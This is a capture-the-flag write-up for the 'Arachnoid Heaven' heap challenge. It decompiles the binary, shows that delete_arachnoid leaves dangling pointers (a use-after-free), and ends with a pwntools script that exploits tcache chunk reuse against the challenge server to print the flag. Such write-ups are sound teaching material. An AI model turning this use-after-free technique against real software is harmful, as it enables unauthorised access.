# Arachnoid Heaven

## First contact with the challenge

Fist of all, let's gather some information on the binary.

```bash
$ file ./arachnoid_heaven 
./arachnoid_heaven: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=257b92e99fc3cf519d91ed1c9ef66676820e238b, not stripped

$ checksec ./arachnoid_heaven
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

So we have got an x86_64 ELF not stripped (which is cool). All the common protections are activated, it will be difficult to exploit a stack overflow. We can then execute it to have an idea of the challenge :

```bash
$ ./arachnoid_heaven 
🕸️ 🕷️  Welcome to Arachnoid Heaven! 🕷️ 🕸️

     🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩
     🔩                        🔩
     🔩  1. Craft  arachnoid   🔩
     🔩  2. Delete arachnoid   🔩
     🔩  3. View   arachnoid   🔩
     🔩  4. Obtain arachnoid   🔩
     🔩  5. Exit               🔩
     🔩                        🔩
     🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩

> 
```

It looks like a typical heap challenge, Use After Free or double free vulnerability. Let's open it in IDA.

## Functions analysis

### Main

The main fuction starts by a setup function that initialisze stdin, stdout, sets the correct permissions and then call alarm(0xff). This last function call will be annoying while debugging because at the end of the timer, an exception will be raised, breaking our debugging section.

```c
unsigned __int64 setup()
{
  __gid_t rgid; // [rsp+4h] [rbp-Ch]
  unsigned __int64 stack_coockie; // [rsp+8h] [rbp-8h]

  stack_coockie = __readfsqword(0x28u);

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);

  rgid = getegid();
  setresgid(rgid, rgid, rgid);

  alarm(0xFFu);

  return __readfsqword(0x28u) ^ stack_coockie;
}
```

So to bypass this, we can patch the call to alarm by replacing `BF FF  00 00 00 E8 40 F7 FF FF` in the code by 10*NOP (0x90).

Then, the menu is printed and we enter the infinite main loop :
```c
  while ( 1 ) {
    printf("%s", welcome);
    read(0, choice, 5uLL);
    
    switch ( atoi(choice) ) {
      case 1:
        craft_arachnoid();
        break;
      case 2:
        delete_arachnoid();
        break;
      case 3:
        view_arachnoid();
        break;
      case 4:
        obtain_arachnoid();
        break;
      case 5:
        exit(0);
      default:
        puts("Invalid Option!");
        break;
    }
  }
}
```

So basically this is just a loop that will input a choice and call the corresponding function. We will now take a look at those functions in the order of the menu.

### craft_arachnoid

```c
unsigned __int64 craft_arachnoid()
{
  _QWORD *v0; // rcx
  __int64 v1; // rdx
  void *v3; // [rsp+0h] [rbp-10h]
  unsigned __int64 stack_coockie; // [rsp+8h] [rbp-8h]

  stack_coockie = __readfsqword(0x28u);

  v3 = malloc(0x10uLL);
  *(_QWORD *)v3 = malloc(0x28uLL);
  *((_QWORD *)v3 + 1) = malloc(0x28uLL);

  printf("%s", "\nName: ");
  read(0, *(void **)v3, 0x14uLL);
  strcpy(*((char **)v3 + 1), defaultCode);

  v0 = (_QWORD *)((char *)&arachnoids + 128 * (__int64)arachnoidCount);
  v1 = *((_QWORD *)v3 + 1);
  *v0 = *(_QWORD *)v3;
  v0[1] = v1;

  printf("Arachnoid Index: %d\n\n", (unsigned int)arachnoidCount);
  ++arachnoidCount;

  return __readfsqword(0x28u) ^ stack_coockie;
}
```

Basically 3 buffers are allocated on the heap:
- a buffer of size `0x10` that will contain the two others
- a first buffer of size `0x28` that will contain a user input of `0x14` chars max
- a second buffer of size `0x28` that will contain de "defaultCode" value wich is the string "bad"

We can then write a structure called "arachnoid" to ease the read of this code in IDA.

```c
00000000 arachnoid struc ; (sizeof=0x10, mappedto_8)
00000000 name dq ?
00000008 code dq ?
00000010 arachnoid ends
```

Don't forget to set the types of name and code to `char *`. We can then produce a more understandabe code: 
```c
unsigned __int64 craft_arachnoid() {

  __int64 **v0; // rcx
  char *code; // rdx
  arachnoid *ARACHNOID; // [rsp+0h] [rbp-10h]
  unsigned __int64 stack_coockie; // [rsp+8h] [rbp-8h]

  stack_coockie = __readfsqword(0x28u);

  ARACHNOID = (arachnoid *)malloc(16uLL);
  ARACHNOID->name = (char *)malloc(0x28uLL);
  ARACHNOID->code = (char *)malloc(40uLL);

  printf("%s", "\nName: ");
  read(0, ARACHNOID->name, 0x14uLL);

  strcpy(ARACHNOID->code, defaultCode);
  v0 = &arachnoids[16 * (__int64)arachnoidCount];

  code = ARACHNOID->code;
  *v0 = (__int64 *)ARACHNOID->name;
  v0[1] = (__int64 *)code;

  printf("Arachnoid Index: %d\n\n", (unsigned int)arachnoidCount);
  ++arachnoidCount;

  return __readfsqword(0x28u) ^ stack_coockie;
}
```
Then our name and code pointers will be copied in a "arachnoids" buffer, and the value "arachnoidCount" will be incremented.

To resume, this functions does this:
```c
ARACHNOID = (arachnoid *) malloc(0x10)
ARACHNOID->name = (char *) malloc(0x28)
ARACHNOID->code = (char *) malloc(0x28)

ARACHNOID->name = user input (max 20 chars)
ARACHNOID->code = "bad"

arachnoids[16 * arachnoidCount] = ARACHNOID->name
arachnoids[16 * arachnoidCount + 8] = ARACHNOID->code

arachnoidCount++
```

We can note that the sizes of the buffers "code" and "name" are the same and take a look at the next function.

### delete_arachnoid

Using our arachnoid structure, the code is pretty straightforward.

```c
unsigned __int64 delete_arachnoid() {

  int index; // [rsp+4h] [rbp-1Ch]
  arachnoid *ARACHNOID; // [rsp+8h] [rbp-18h]
  char buf[2]; // [rsp+16h] [rbp-Ah] BYREF
  unsigned __int64 stack_coockie; // [rsp+18h] [rbp-8h]

  stack_coockie = __readfsqword(0x28u);

  printf("Index: ");
  read(0, buf, 2uLL);

  index = atoi(buf);
  ARACHNOID = (arachnoid *)&arachnoids[16 * (__int64)index];

  printf("Arachnoid %d:\n\nName: %s\nCode: %s\n", (unsigned int)index, ARACHNOID->name, ARACHNOID->code);

  if (index >= 0 && index < arachnoidCount) {
    free(ARACHNOID->name);
    free(ARACHNOID->code);
  
  } else {
    puts("Invalid Index!");
  }

  return __readfsqword(0x28u) ^ stack_coockie;
}
```

We can note 3 interesting things: 
- The arachnoidCounter is not decremented when an arachnoid is delete
- The arachnoid's name and code are passed to `free()` but not the arachnoid itself
- The pointers are not set to `NULL` after the `free()`

This can lead to a Use after free and a double free vulnerability.

### `view_arachnoids`

This function will just print the name and code of all the arachnoids in arachnoids.

```c
unsigned __int64 view_arachnoid() {

  int i; // [rsp+Ch] [rbp-14h]
  unsigned __int64 stack_coockie; // [rsp+18h] [rbp-8h]

  stack_coockie = __readfsqword(0x28u);

  for ( i = 0; i < arachnoidCount; ++i )
    printf(
      "Arachnoid %d:\nName: %s\nCode: %s\n",
      (unsigned int)i,
      (const char *)arachnoids[16 * (__int64)i],
      (const char *)arachnoids[16 * (__int64)i + 1]);

  return __readfsqword(0x28u) ^ stack_coockie;
}
```

Because arachnoidCount is not decremented in `delete_arachnoid` and than pointers in arachnoids are not set to `NULL`, we could use this function to print free chunks.

### obtain_arachnoid

```c
unsigned __int64 obtain_arachnoid() {

  int index; // [rsp+Ch] [rbp-24h]
  char buf[2]; // [rsp+26h] [rbp-Ah] BYREF
  unsigned __int64 stack_coockie; // [rsp+28h] [rbp-8h]

  stack_coockie = __readfsqword(0x28u);

  puts("Arachnoid: ");
  read(0, buf, 2uLL);

  index = atoi(buf);
  if ( index >= 0 && index < arachnoidCount ) {
    if ( !strncmp((const char *)arachnoids[16 * (__int64)index + 1], "sp1d3y", 6uLL) )
      system("cat flag.txt");
    else
      puts("Unauthorised!");
  
  } else {
    puts("Invalid Index!");
  }
  return __readfsqword(0x28u) ^ stack_coockie;
}
``` 

To resume this function, it will print the flag if `the_selected_arachnoid->code (initialised with "bad") == "sp1d3y"`. Otherwise, it will print the message "Unauthorised!".


## Exploitation idea

The main goal is to get `an_arachnoid->code == "sp1d3y"`. For this, we can remember that :
- We can't overlow an_arachnoid->code (size of `0x28` and input limited to `0x14` chars)
- We can provoque a double free, but we first need to fill the tcache so the chunks will pop in the fastbin and the double free protection will be only based on the precedent chunk passed to free
- We can have a Use After Free, that's what we are going to exploit!

The idea is: 
- crafting an `arachnoid_A` with a random name 
- freeing this arachnoid
    - free the name (size of `0x28`)
        - goes in tcache bin
    - free the code (size of `0x28`)
        - goes in tcache bin
    - don't set to `NULL` pointers in arachnoids
    - don't decrement arachnoidCouter
- crafting an arachnoid_B
    - `name = malloc(0x28)`
        - will be the same pointer as `arachnoid_A->code` because of LIFO in tcache bin
        - set it to "sp1d3y"
    - `code = malloc(0x28)`
        - will be the same pointer as `arachnoid_A->name` because of LIFO in tcache bin
- `obtain_arachnoid` with index 0 for `arachnoid_A`
    - --> here is the UAF !
    - `arachnoid_A->code == arachnoid_B->name == "sp1d3y"`
- get the flag!!!

## Final solving script

Let's write a little pwntools script:  
```python
from pwn import *

r = remote('167.172.58.213', 31697)
# r = process('./arachnoid_heaven')

# Crafting arachnoid_A with a random name
r.sendlineafter('> ', '1')
r.sendlineafter('Name: ', 'random')

# Deleting arachnoid_A
r.sendlineafter('> ', '2')
r.sendlineafter('Index: ', '0')

# Crafting arachnoid_B with the name "sp1d3y"
r.sendlineafter('> ', '1')
r.sendlineafter('Name: ', 'sp1d3y')

# Obtaining the flag with arachnoid_A
r.sendlineafter('> ', '4')
r.sendlineafter('Arachnoid: ', '0')

# Getting the flag
flag = r.recvall(timeout=1).split(b'\n')[1].decode()
log.success(f"FLAG : {flag}")
```
Let's try it :
```bash
$ python3 solve_arachnoids.py 
[+] Opening connection to 167.172.58.213 on port 31697: Done
[+] Receiving all data: Done (426B)
[*] Closed connection to 167.172.58.213 port 31697
[+] FLAG : HTB{l3t_th3_4r4chn01ds_fr3333}
```

And we've got the flag ! That was a nice challenge to introduce heap concepts.